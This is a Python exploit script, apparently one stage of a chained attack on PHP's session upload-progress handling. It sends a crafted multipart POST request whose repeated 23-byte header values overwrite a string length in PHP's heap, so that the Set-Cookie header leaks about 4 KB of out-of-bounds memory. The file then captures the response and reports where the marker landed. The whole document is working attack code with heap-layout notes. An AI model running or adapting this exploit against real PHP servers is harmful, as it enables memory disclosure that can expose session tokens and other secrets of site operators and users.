#!/usr/bin/env python3
"""B (pure HTTP): use the LAST part's unknown multipart headers as live 24B
smart_strings.  The A leaves PS(id)=chunk+0x6e080 in the 24B page 0x6e;
slot 6 starts at chunk+0x6e090, exactly ZSTR_LEN(id).  A 23-byte header value
at slot6 writes len=0x1000 at +0x10 and MARK at +0x18; the END cleanup's
php_session_reset_id then emits Set-Cookie with a 0x1000-byte OOB read.
usage: b_24hdr.py [MARK] [NVALS]
"""
import socket,sys,struct
MARK=(sys.argv[1] if len(sys.argv)>1 else 'MARKMARK').encode()[:8].ljust(8,b'M')
N=int(sys.argv[2]) if len(sys.argv)>2 else 16
BND=b'B'*10
val=struct.pack('<Q',0x1000)+MARK+b'F'*7   # 23 bytes -> 24B smart_string
assert len(val)==23
o=bytearray()
o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\nattacksessionid0001\r\n'
h=b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
for i in range(N):
    h += b'X-%02d: '%i + val + b'\r\n'
o+=b'--'+BND+b'\r\n'+h+b'\r\n'+b'pwn'+b'\r\n'
o+=b'--'+BND+b'--\r\n'
req=(f'POST /plain.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(req+bytes(o))
    while len(data)<200000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
open('/tmp/b_24hdr.resp','wb').write(data)
head,_,rest=data.partition(b'\r\n\r\n')
print('RESP_LEN',len(data))
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line))
        print('VALUE',line[:180].decode('latin1','replace'))
        print('MARKPOS',line.find(MARK))
print('BODY',rest[:80].decode('latin1','replace'))
